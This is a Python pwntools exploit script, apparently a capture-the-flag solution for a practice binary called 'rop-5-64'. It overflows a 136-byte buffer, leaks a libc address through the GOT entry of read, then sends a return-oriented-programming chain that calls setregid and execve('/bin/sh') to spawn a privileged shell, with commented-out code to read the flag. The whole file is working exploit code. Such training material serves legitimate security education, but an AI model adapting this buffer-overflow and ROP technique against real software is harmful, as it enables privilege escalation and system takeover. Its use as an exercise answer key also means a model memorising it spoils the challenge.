from pwn import *
import os

DEBUG = False 
file = "./rop-5-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)
libc = elf.libc
max_len = 136

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *input_func
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

got_read = p64(elf.got["read"])
puts = p64(elf.symbols["puts"])
input_func = p64(elf.symbols["input_func"])
pop_rdi = p64(0x0000000000400763)

payload = flat (
    b"A" * max_len,
    pop_rdi,
    got_read,
    puts,
    input_func,
)

io.sendline(payload)

io.recvuntil(b'!\n')


libc_read = u64(io.recv(6) + b"\0\0")
libc_address = libc_read - libc.symbols["read"]
libc.address = libc_address

print("libc_address", hex(libc.address))

setregid = p64(libc.symbols["setregid"])

pop_rsi_2 = p64(0x0000000000400761)
pop_rdx_2 = p64(0x0000000000400688)

execve = p64(libc.symbols["execve"])
binsh = p64(next(libc.search(b'/bin/sh')))

payload = flat (
    b"A" * max_len,
    pop_rdi,
    p64(50009),
    pop_rsi_2,
    p64(50009),
    p64(50009),
    setregid,
    pop_rdi,
    binsh,
    pop_rsi_2,
    p64(0),
    p64(0),
    pop_rdx_2,
    p64(0),
    p64(0),
    execve,
)
io.sendline(payload)

io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
